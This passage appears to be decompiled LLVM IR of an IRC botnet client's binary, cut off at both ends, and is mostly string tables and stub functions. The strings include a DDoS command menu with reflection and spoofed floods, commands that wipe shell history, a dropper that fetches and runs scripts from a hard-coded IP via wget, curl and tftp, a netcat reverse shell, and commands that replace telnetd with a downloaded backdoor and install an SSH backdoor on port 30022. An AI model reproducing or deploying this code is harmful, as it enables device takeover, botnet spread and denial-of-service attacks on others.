@global_var_35630.632, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35638.749, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35640.750, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35644.751, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35648.752, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_3564c.753, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35650.754, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35654.755, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35658.756, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_3565c.757, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35660.758, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35664.759, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35668.760, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3566c.761, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35670.762, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35674.763, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35678.764, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3567c.765, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35680.766, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35684.767, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35688.768, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3568c.769, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35694.770, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3569c.771, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_356a4.772, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_356ac.773, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_356b4.774, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_356bc.775, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_356c4.776, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_356cc.777, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_356d8.778, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_356e0.779, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_356e8.780, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_356f4.781, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_356fc.782, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35704.783, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3570c.784, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35714.785, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3571c.786, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35724.787, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3572c.788, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35738.789, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35740.790, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35748.791, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35750.792, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35758.793, i32 0, i32 0)]
@global_var_389e0.866 = constant [123 x i8] c"pkill -9 %s || busybox pkill -9 %s || /usr/busybox pkill -9 %s || /bin/busybox pkill -9 %s || /var/run/busybox pkill -9 %s\00"
@global_var_38a5c.868 = constant [22 x i8] c"history -c;history -w\00"
@global_var_38a74.870 = constant [29 x i8] c"cd /root;rm -f .bash_history\00"
@global_var_38a94.872 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_38aac.874 = constant [30 x i8] c"NOTICE %s :%s resolves to %s\0A\00"
@global_var_38acc.876 = constant [28 x i8] c"NOTICE %s :DNS2IP <domain>\0A\00"
@global_var_38ae8.878 = constant [40 x i8] c"NOTICE %s :UPDATEHTTP <host> <src:bin>\0A\00"
@global_var_38b10.880 = constant [96 x i8] c"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\0A\00"
@global_var_38b70.884 = constant [11 x i8] c"gcc --help\00"
@global_var_38b7c.887 = constant [6 x i8] c"Usage\00"
@global_var_38b84.890 = constant [30 x i8] c"NOTICE %s :Receiving update.\0A\00"
@global_var_38ba4.892 = constant [11 x i8] c"mkdir /tmp\00"
@global_var_38bb0.894 = constant [8 x i8] c"/tmp/.c\00"
@global_var_525bc.898 = global i32 0
@global_var_38bb8.900 = constant [70 x i8] c"(gcc -o %s /tmp/.c; rm -f /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1\00"
@global_var_38c00.902 = constant [8 x i8] c"/tmp/.o\00"
@global_var_38c08.904 = constant [188 x i8] c"export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;chmod +x /tmp/.o; trap '' 1;sh -c '/var/bin/killall knight*;/var/bin/killall kt*;/var/bin/killall .o;/var/bin/sleep 5;trap  1;/tmp/.o '&\00"
@global_var_38cc4.906 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_526c0.908 = global i32 0
@global_var_49b38.910 = global i32 0
@global_var_38ce0.912 = constant [9 x i8] c"/var/bin\00"
@global_var_38cec.914 = constant [40 x i8] c"NOTICE %s :HACKPGK <url> <binary name>\0A\00"
@global_var_38d14.920 = constant [277 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_38e2c.925 = constant [39 x i8] c"NOTICE %s :Installed %s to hack path.\0A\00"
@global_var_38e54.927 = constant [21 x i8] c"cat %s > /var/bin/%s\00"
@global_var_38e6c.929 = constant [9 x i8] c"rm -f %s\00"
@global_var_38e78.931 = constant [22 x i8] c"chmod 775 /var/bin/%s\00"
@global_var_38e90.933 = constant [18 x i8] c"ls -l /var/bin/%s\00"
@global_var_38ea4.935 = constant [55 x i8] c"NOTICE %s :Non-root/non-spoof DDoS commands commands:\0A\00"
@global_var_38edc.937 = constant [69 x i8] c"NOTICE %s :    STD <host> <port> <time> = A non spoofed STD flooder\0A\00"
@global_var_38f24.939 = constant [84 x i8] c"NOTICE %s :    OVH <host> <port> <throttle> <time> = A non spoofed UDP OVH flooder\0A\00"
@global_var_38f78.941 = constant [84 x i8] c"NOTICE %s :    vTCP <ip> <port> <time> = A non spoofed Randomizer TCP flooder Flag\0A\00"
@global_var_38fcc.943 = constant [74 x i8] c"NOTICE %s :    HOLD <host> <port> <time> = A vanilla TCP connect flooder\0A\00"
@global_var_39018.945 = constant [75 x i8] c"NOTICE %s :    JUNK <host> <port> <time> = A vanilla TCP flooder (modded)\0A\00"
@global_var_39064.947 = constant [143 x i8] c"NOTICE %s :    UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs> = An advanced non spoof UDP flooder modified by Freak\0A\00"
@global_var_390f4.949 = constant [105 x i8] c"NOTICE %s :    HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder\0A\00"
@global_var_39160.951 = constant [60 x i8] c"NOTICE %s :    WGETFLOOD <url> <secs> = An HTTP(S) flooder\0A\00"
@global_var_3919c.953 = constant [33 x i8] c"NOTICE %s :Spoof/root commands:\0A\00"
@global_var_391c0.955 = constant [59 x i8] c"NOTICE %s :    UDP <target> <port> <secs> = A UDP flooder\0A\00"
@global_var_391fc.957 = constant [124 x i8] c"NOTICE %s :    VSET <method> <target> <thread> <time> = Valve Source Engine Flood, using the TQuery Engine Source EXPLOIT.\0A\00"
@global_var_39278.959 = constant [105 x i8] c"NOTICE %s :    PAN <target> <port> <secs> = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_392e4.961 = constant [166 x i8] c"NOTICE %s :    TCP <target> <port> <time> <flags> <packetsize> <pollinterval> <threads> = An advanced TCP flooder with multithreading. Will kill almost any service.\0A\00"
@global_var_3938c.963 = constant [95 x i8] c"NOTICE %s :    GIGATCP Flooding <target> <flags/method> <secs> = Advanced Spoofed TCP Flooder\0A\00"
@global_var_393ec.965 = constant [141 x i8] c"NOTICE %s :    BLACKNURSE <target ip> <secs> = An ICMP packet flooder that will crash most firewalls and use loads of CPU. USE EXTREME CARE\0A\00"
@global_var_3947c.967 = constant [85 x i8] c"NOTICE %s :    SOCKSTRESS <ip>:<port> <interface> -s <time> [-p payload] [-d delay]\0A\00"
@global_var_394d4.969 = constant [152 x i8] c"NOTICE %s :    NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A NTP DrDoS flooder. Very potent.\0A\00"
@global_var_3956c.971 = constant [114 x i8] c"NOTICE %s :    DNS <IP> <port> <reflection file url> <threads> <time> = A DNS DrDoS flooder. Almost unblockable.\0A\00"
@global_var_395e0.973 = constant [159 x i8] c"NOTICE %s :    SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Insane amp factor (600 - 1700x)\0A\00"
@global_var_39680.975 = constant [28 x i8] c"NOTICE %s :Other commands:\0A\00"
@global_var_3969c.977 = constant [54 x i8] c"NOTICE %s :    RNDNICK = Randomizes the knights nick\0A\00"
@global_var_396d4.979 = constant [61 x i8] c"NOTICE %s :    NICK <nick> = Changes the nick of the client\0A\00"
@global_var_39714.981 = constant [50 x i8] c"NOTICE %s :    SERVER <server> = Changes servers\0A\00"
@global_var_39748.983 = constant [54 x i8] c"NOTICE %s :    GETSPOOFS = Gets the current spoofing\0A\00"
@global_var_39780.985 = constant [63 x i8] c"NOTICE %s :    SPOOFS <subnet> = Changes spoofing to a subnet\0A\00"
@global_var_397c0.987 = constant [66 x i8] c"NOTICE %s :    DISABLE = Disables all packeting from this client\0A\00"
@global_var_39804.989 = constant [64 x i8] c"NOTICE %s :    ENABLE = Enables all packeting from this client\0A\00"
@global_var_39844.991 = constant [40 x i8] c"NOTICE %s :    KILL = Kills the knight\0A\00"
@global_var_3986c.993 = constant [32 x i8] c"NOTICE %s :    DNS2IP <domain>\0A\00"
@global_var_3988c.995 = constant [101 x i8] c"NOTICE %s :    GET <http address> <save as> = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_398f4.997 = constant [66 x i8] c"NOTICE %s :    UPDATE <http address> <src:bin> = Update this bot\0A\00"
@global_var_39938.999 = constant [108 x i8] c"NOTICE %s :    HACKPKG <http address> <bin name> = HackPkg is here! Install a bin, using http, no depends!\0A\00"
@global_var_399a4.1001 = constant [53 x i8] c"NOTICE %s :    VERSION = Requests version of client\0A\00"
@global_var_399dc.1003 = constant [54 x i8] c"NOTICE %s :    KILLALL = Kills all current packeting\0A\00"
@global_var_39a14.1005 = constant [37 x i8] c"NOTICE %s :    HELP = Displays this\0A\00"
@global_var_39a3c.1007 = constant [65 x i8] c"NOTICE %s :    IRC <command> = Sends this command to the server\0A\00"
@global_var_39a80.1009 = constant [50 x i8] c"NOTICE %s :    SH <command> = Executes a command\0A\00"
@global_var_39ab4.1011 = constant [66 x i8] c"NOTICE %s :    ISH <command> = SH, interactive, sends to channel\0A\00"
@global_var_39af8.1013 = constant [69 x i8] c"NOTICE %s :    SHD <command> = Executes a psuedo-daemonized command\0A\00"
@global_var_39b40.1015 = constant [59 x i8] c"NOTICE %s :    GETBB <tftp server> = Get a proper busybox\0A\00"
@global_var_39b7c.1017 = constant [92 x i8] c"NOTICE %s :    INSTALL  <http server/file_name> = Download & install a binary to /var/bin \0A\00"
@global_var_39bd8.1019 = constant [59 x i8] c"NOTICE %s :    BASH <cmd> = Execute commands using bash. \0A\00"
@global_var_39c14.1021 = constant [88 x i8] c"NOTICE %s :    BINUPDATE <http:server/package> = Update a binary in /var/bin via wget \0A\00"
@global_var_39c6c.1023 = constant [93 x i8] c"NOTICE %s :    SCAN <nmap options> = Call the nmap wrapper script and scan with your opts. \0A\00"
@global_var_39ccc.1025 = constant [80 x i8] c"NOTICE %s :    RSHELL <server> <port> = Equates to nohup nc ip port -e /bin/sh\0A\00"
@global_var_39d1c.1027 = constant [102 x i8] c"NOTICE %s :    LOCKUP <http:server> = Kill telnet, d/l aes backdoor from <server>, run that instead.\0A\00"
@global_var_39d84.1029 = constant [111 x i8] c"NOTICE %s :    GETSSH <http:server/dropbearmulti> = D/l, install, configure and start dropbear on port 30022.\0A\00"
@global_var_39df4.1032 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_5259c.1036 = local_unnamed_addr global i32 0
@global_var_39e10.1038 = constant [21 x i8] c"kill -9 %d;kill -9 0\00"
@global_var_39e28.1040 = constant [5 x i8] c"%s%s\00"
@global_var_39e30.1042 = constant i32 33
@global_var_39e34.1044 = constant [29 x i8] c"NOTICE %s :History cleared!\0A\00"
@global_var_44ad4.1046 = local_unnamed_addr global i32 3
@global_var_35090.1048 = constant [12 x i8] c"Kuze-senpai\00"
@global_var_3509c.1049 = constant [9 x i8] c"Morpheus\00"
@global_var_350a8.1050 = constant [7 x i8] c"APIBot\00"
@global_var_350b0.1051 = constant [344 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.239.64.5/owari.sh || curl -O http://23.239.64.5/owari.sh; chmod 777 owari.sh; sh owari.sh; busybox tftp 23.239.64.5 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 23.239.64.5; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf owari.sh tftp1.sh tftp2.sh\00"
@global_var_44ad8.1052 = global [4 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_35090.1048, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3509c.1049, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_350a8.1050, i32 0, i32 0), i8* getelementptr inbounds ([344 x i8], [344 x i8]* @global_var_350b0.1051, i32 0, i32 0)]
@global_var_39f74.1056 = constant [5 x i8] c"IRC \00"
@global_var_39f7c.1060 = constant [4 x i8] c"%s\0A\00"
@global_var_39f80.1062 = constant [4 x i8] c"SH \00"
@global_var_39f84.1064 = constant [69 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_39fcc.1067 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_39fdc.1069 = constant [5 x i8] c"SHD \00"
@global_var_39fe4.1071 = constant [100 x i8] c"export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&\00"
@global_var_3a048.1073 = constant [7 x i8] c"GETBB \00"
@global_var_3a050.1075 = constant [330 x i8] c"export fileGet=busybox-mips;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\22$fileGet\22 ] || [ ! -s /var/\22$fileGet\22 ]) && tftp -g -r \22$fileGet\22 %s && chmod +x \22$fileGet\22 && ./\22$fileGet\22 mkdir bin && ./\22$fileGet\22 --install -s /var/bin && ls -l \22$fileGet\22 || echo It appears we already have /var/\22$fileGet\22)\00"
@global_var_3a19c.1077 = constant [8 x i8] c"GETSSH \00"
@global_var_3a1a4.1079 = constant [668 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo \22$url\22 | sed 's#.*/##'` && wget -O \22$name\22 \22$url\22;chmod +x \22$name\22;mv \22$name\22 /var/bin;ls -l /var/bin/\22$name\22 && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT\00"
@global_var_3a440.1081 = constant [9 x i8] c"INSTALL \00"
@global_var_3a44c.1083 = constant [389 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo \22$name either doesnt exist or eq 0 so we get\22 && cd /tmp && wget -O \22$name\22 \22$url\22 && chmod +x \22$name\22 && mv \22$name\22 /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22It appears I already have $name\22)\00"
@global_var_3a5d4.1085 = constant [11 x i8] c"BINUPDATE \00"
@global_var_3a5e0.1087 = constant [371 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22$name doesnt exist, perhaps you mean INSTALL?\22\00"
@global_var_3a754.1089 = constant [8 x i8] c"LOCKUP \00"
@global_var_3a75c.1091 = constant [235 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/dmips ] && cd /var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd) && (nohup dmips || trap '' 1 2 /var/bin/dmips)\00"
@global_var_3a848.1093 = constant [8 x i8] c"RSHELL \00"
@global_var_3a850.1095 = constant [114 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nohup nc %s -e /bin/sh '&\00"
@global_var_3a8c4.1097 = constant [6 x i8] c"SCAN \00"
@global_var_3a8cc.1099 = constant [406 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo \22I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:/\5Cserver/nmap and INSTALL http://server/scan first...\22 && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /var/bin/scan ] && ls -l /var/bin/scan) || scan %s)\00"
@global_var_3aa64.1101 = constant [6 x i8] c"BASH \00"
@global_var_3aa6c.1103 = constant [98 x i8] c"export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s\00"
@global_var_39e54.1106 = constant [4 x i8] c"STD\00"
@global_var_45364.1107 = global [4 x i8]* @global_var_39e54.1106
@global_var_3aad0.1110 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_536e0.1113 = local_unnamed_addr global i32 0
@global_var_3aae0.1115 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_3aaf0.1117 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_3aaf8.1120 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_3ab04.1125 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_44ac8.1135 = local_unnamed_addr global i32 1
@global_var_35080.1137 = constant [14 x i8] c"89.46.222.250\00"
@global_var_44acc.1138 = global [14 x i8]* @global_var_35080.1137
@global_var_3ab84.1143 = constant [20 x i8] c"KuzesenpaiIsYourGod\00"
@global_var_3ab98.1145 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_3abac.1148 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_3abbc.1150 = constant i32 47
@global_var_3abc0.1152 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_3abc8.1154 = constant i32 97
@global_var_525b8.1158 = local_unnamed_addr global i32 0
@global_var_3abcc.1161 = constant [7 x i8] c"#owari\00"
@global_var_3abd4.1164 = constant i32 0
@global_var_3abd8.1168 = constant [48 x i8] c"NICK [%s|%s]%s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_3ac08.1173 = constant i32 10
@global_var_3ac0c.1175 = constant i32 42
@global_var_3ab64.1177 = constant [4 x i8] c"352\00"
@global_var_45494.1178 = global [4 x i8]* @global_var_3ab64.1177
@global_var_3ac10.1180 = constant [6 x i8] c"ERROR\00"
@global_var_44990.1184 = global i32 0
@global_var_23254.1198 = constant i32 -382910336
@global_var_1ccd8.1208 = constant i32 -442564576
@global_var_23430.1209 = constant i32 -382910336
@global_var_1cd04.1216 = constant i32 -449978364
@global_var_28814.1222 = constant i32 -449978364
@global_var_1cd1c.1228 = constant i32 -382906384
@global_var_1d024.1229 = constant i32 -369098748
@global_var_1d84c.1256 = constant i32 -509607928
@global_var_1d870.1257 = constant [3 x i8] c"]\08\00"
@global_var_1d898.1259 = constant i32 -509607928
@global_var_1d940.1264 = constant i32 -442564496
@global_var_1e9d4.1269 = constant i32 -476041216
@global_var_9704.1317 = constant i32 -516948194
@global_var_1e940.1326 = constant i32 -449978364
@global_var_227dc.1376 = constant i32 -382910352
@global_var_2318c.1384 = constant i32 -382910336
@global_var_1fb5c.1395 = constant i32 -382909968
@global_var_1efd8.1417 = constant i32 -382910352
@global_var_21250.1419 = constant i32 -498216928
@global_var_22054.1420 = constant i32 -509587455
@global_var_1c974.1426 = constant i32 -382910416
@global_var_2b78c.1436 = constant i32 -382910416
@global_var_20de8.1451 = constant i32 -476053394
@global_var_20fa8.1455 = constant i32 -442695668
@global_var_1f864.1467 = constant i32 -449978364
@global_var_217b0.1480 = constant i32 -369098748
@global_var_21880.1484 = constant i32 -442564556
@global_var_21994.1494 = constant i32 -369098748
@global_var_21a90.1498 = constant i32 -369098750
@global_var_21b7c.1499 = constant i32 -369098748
@global_var_20b20.1511 = constant i32 -382910224
@global_var_21e6c.1517 = constant i32 -369098748
@global_var_224e4.1551 = constant i32 -476053493
@global_var_23580.1559 = constant i32 -382910336
@global_var_25970.1568 = constant i32 -382906384
@global_var_29ae4.1572 = constant i32 -382909968
@global_var_23e58.1595 = constant i32 -442695648
@global_var_20003.1601 = constant i32 33792
@global_var_241e4.1611 = constant i32 -509607926
@global_var_243b4.1621 = constant i32 -382910448
@global_var_2c524.1622 = constant i32 -382909968
@global_var_2c5d8.1628 = constant i32 -382910224
@global_var_255ec.1662 = constant i32 -509607928
@global_var_25e8c.1694 = constant i32 -456978431
@global_var_25f40.1708 = constant i32 -369091290
@global_var_28ad4.1757 = constant i32 -478871519
@global_var_29554.1771 = constant i32 -478805983
@global_var_29930.1780 = constant i32 -382906384
@global_var_23554.1789 = constant i32 -509591552
@global_var_29ef0.1795 = constant i32 -442564540
@global_var_2a7f0.1838 = constant i32 -494075872
@global_var_2a9b0.1850 = constant i32 -369098421
@global_var_29d60.1872 = constant i32 -442543860
@global_var_2b494.1893 = constant i32 -335545213
@global_var_2bc98.1933 = constant i32 -443088884
@global_var_23f3c.1946 = constant i32 -382906384
@global_var_2eac0.1990 = constant i32 -442564524
@global_var_2c344.1991 = constant i32 -382910448
@global_var_2ea5c.2002 = constant i32 -382909968
@global_var_2ed64.2012 = constant i32 -509607923
@global_var_2e9a0.2013 = constant i32 -382910224
@global_var_2ef10.2024 = constant i32 -509607923
@global_var_f230.2043 = constant i32 -516948194
@global_var_235b8.2048 = constant i32 -382910336
@global_var_2fb30.2053 = constant i32 -442695584
@global_var_300f8.2062 = constant i32 -382910224
@global_var_28798.2083 = constant i32 -382910336
@global_var_daac.2087 = constant i32 -451215308
@global_var_30a50.2104 = constant i32 -382909456
@global_var_312f4.2122 = constant i32 -442695632
@global_var_31430.2130 = constant i32 -442695632
@global_var_314bc.2131 = constant i32 -369098743
@global_var_3153c.2132 = constant i32 -369098742
@global_var_31834.2133 = constant i32 -369098742
@global_var_31930.2134 = constant i32 -369098739
@global_var_31ab8.2138 = constant i32 -369098742
@global_var_31e58.2148 = constant i32 -369098730
@global_var_32180.2153 = constant i32 -444268464
@global_var_3315c.2184 = constant i32 -369098675
@global_var_334f0.2205 = constant i32 -444268484
@global_var_33d44.2215 = constant i32 -369098738
@global_var_31c44.2218 = constant i32 -382908944
@global_var_34078.2219 = constant i32 -369098743
@global_var_34188.2226 = constant i32 -514850805
@global_var_34888.2234 = constant i32 -504313148
@global_var_34870.2235 = constant i32 -483131392
@global_var_3471c.2236 = constant i32 -481229311
@global_var_348f8.2237 = constant i32 -477817729
@global_var_349f8.2238 = constant i32 -476034303
@global_var_34c34.2239 = constant i32 -516685812
@global_var_34b28.2240 = constant i32 -905969571
@global_var_34a5c.2241 = constant i32 -528203771
@global_var_34cbc.2242 = constant i32 -478079873
@global_var_34ca0.2243 = constant i32 -534704125
@global_var_34c50.2244 = constant i32 -534704125
@global_var_34be8.2245 = constant i32 -483131392
@global_var_49b18.17 = external global i8*
@global_var_49b4c.35 = external global i8*
@global_var_49b3c.37 = external global i8*
@global_var_49b40.47 = external global i8*
@global_var_37000.155 = external local_unnamed_addr constant i8*
@global_var_49f50.585 = external global i8*
@global_var_49f51.587 = local_unnamed_addr global i8 0
@global_var_49f52.588 = local_unnamed_addr global i8 0
@global_var_49f53.589 = local_unnamed_addr global i8 0
@global_var_49b43.1127 = external local_unnamed_addr global i8*
@global_var_49b42.1128 = external local_unnamed_addr global i8*
@global_var_49b41.1129 = external local_unnamed_addr global i8*
@global_var_37118.168 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
